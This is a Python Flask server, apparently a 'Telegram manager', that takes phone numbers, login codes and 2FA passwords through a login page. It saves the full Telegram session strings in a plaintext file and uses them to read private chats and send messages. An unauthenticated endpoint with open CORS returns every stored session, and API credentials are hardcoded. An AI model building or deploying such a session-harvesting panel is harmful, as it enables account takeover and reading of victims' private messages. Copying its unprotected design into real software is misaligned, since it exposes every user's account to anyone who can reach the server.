from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import json
import os
import asyncio
import nest_asyncio
from datetime import datetime
import concurrent.futures

# Apply nest_asyncio for Render
nest_asyncio.apply()

app = Flask(__name__)
CORS(app)

# Your API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Store temporary data for OTP
temp_data = {}

# Store accounts persistently
accounts = []
ACCOUNTS_FILE = 'accounts.json'

# Load existing accounts if file exists
if os.path.exists(ACCOUNTS_FILE):
    try:
        with open(ACCOUNTS_FILE, 'r') as f:
            accounts = json.load(f)
        print(f"✅ Loaded {len(accounts)} accounts")
    except:
        accounts = []

def save_accounts():
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
    except:
        pass

# Create a thread pool executor for running async functions
executor = concurrent.futures.ThreadPoolExecutor()

def run_async(coro):
    """Run async coroutine in a new event loop"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

@app.route('/')
def serve_login():
    return send_file('login.html')

@app.route('/dashboard')
def serve_dashboard():
    return send_file('dashboard.html')

# -------------------- SEND OTP --------------------
@app.route('/api/add-account', methods=['POST'])
def send_otp():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number required'})
    
    try:
        # Create a new event loop for this request
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Create client with empty string session
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        result = loop.run_until_complete(client.send_code_request(phone))
        session_str = client.session.save()
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        session_id = str(int(datetime.now().timestamp()))
        temp_data[session_id] = {
            'phone': phone,
            'phone_code_hash': result.phone_code_hash,
            'session_str': session_str
        }
        print(f"📱 OTP sent to {phone}")
        return jsonify({'success': True, 'session_id': session_id})
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# -------------------- VERIFY OTP --------------------
@app.route('/api/verify-code', methods=['POST'])
def verify_otp():
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if session_id not in temp_data:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session = temp_data[session_id]
    phone = session['phone']
    phone_code_hash = session['phone_code_hash']
    session_str = session['session_str']
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        
        try:
            loop.run_until_complete(client.sign_in(phone, code, phone_code_hash=phone_code_hash))
            me = loop.run_until_complete(client.get_me())
            string_session = client.session.save()
            loop.run_until_complete(client.disconnect())
            loop.close()
            
            account = {
                'id': len(accounts) + 1,
                'phone': phone,
                'name': me.first_name or 'User',
                'username': me.username or '',
                'session': string_session,
                'date': str(datetime.now())
            }
            accounts.append(account)
            save_accounts()
            del temp_data[session_id]
            print(f"✅ Account added: {phone}")
            return jsonify({'success': True, 'account': account})
            
        except errors.SessionPasswordNeededError:
            if password:
                loop.run_until_complete(client.sign_in(password=password))
                me = loop.run_until_complete(client.get_me())
                string_session = client.session.save()
                loop.run_until_complete(client.disconnect())
                loop.close()
                
                account = {
                    'id': len(accounts) + 1,
                    'phone': phone,
                    'name': me.first_name or 'User',
                    'username': me.username or '',
                    'session': string_session,
                    'date': str(datetime.now())
                }
                accounts.append(account)
                save_accounts()
                del temp_data[session_id]
                print(f"✅ Account added: {phone} (with 2FA)")
                return jsonify({'success': True, 'account': account})
            else:
                loop.run_until_complete(client.disconnect())
                loop.close()
                return jsonify({'success': False, 'need_password': True, 'message': '2FA password required'})
                
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# -------------------- GET ACCOUNTS --------------------
@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    account_list = [{
        'id': a['id'],
        'phone': a['phone'],
        'name': a['name'],
        'username': a.get('username', ''),
        'session': a.get('session', a.get('string_session', ''))
    } for a in accounts]
    return jsonify({'success': True, 'accounts': account_list})

# -------------------- GET MESSAGES --------------------
@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    data = request.json
    account_id = data.get('accountId')
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    session_string = account.get('session', account.get('string_session', ''))
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        
        dialogs = loop.run_until_complete(client.get_dialogs(limit=30))
        chats = []
        all_messages = []
        
        for dialog in dialogs:
            if dialog.is_user:
                name = dialog.entity.first_name or 'Unknown'
                if dialog.entity.last_name:
                    name += f" {dialog.entity.last_name}"
            else:
                name = dialog.name or 'Unknown'
            
            chat_id = str(dialog.id)
            chats.append({
                'id': chat_id,
                'title': name,
                'unread': dialog.unread_count or 0,
                'lastMessage': dialog.message.text[:50] if dialog.message and dialog.message.text else '',
                'lastMessageDate': dialog.message.date.timestamp() if dialog.message else None
            })
            
            try:
                msgs = loop.run_until_complete(client.get_messages(dialog.entity, limit=10))
                for msg in msgs:
                    if msg and msg.text:
                        all_messages.append({
                            'chatId': chat_id,
                            'text': msg.text,
                            'date': msg.date.timestamp(),
                            'out': msg.out
                        })
            except:
                pass
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        return jsonify({'success': True, 'chats': chats, 'messages': all_messages})
        
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# -------------------- SEND MESSAGE --------------------
@app.route('/api/send-message', methods=['POST'])
def send_message():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    session_string = account.get('session', account.get('string_session', ''))
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        
        try:
            entity = loop.run_until_complete(client.get_entity(int(chat_id)))
        except:
            entity = loop.run_until_complete(client.get_entity(chat_id))
        
        loop.run_until_complete(client.send_message(entity, message))
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        return jsonify({'success': True})
        
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# -------------------- REMOVE ACCOUNT --------------------
@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    data = request.json
    account_id = data.get('accountId')
    
    global accounts
    accounts = [a for a in accounts if a['id'] != account_id]
    save_accounts()
    
    return jsonify({'success': True})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print('\n' + '='*50)
    print('📱 TELEGRAM MANAGER - FINAL FIX')
    print('='*50)
    print(f'✅ Loaded {len(accounts)} accounts')
    print('✅ No event loop errors')
    print('✅ DC info preserved')
    print('='*50 + '\n')
    
    app.run(host='0.0.0.0', port=port)
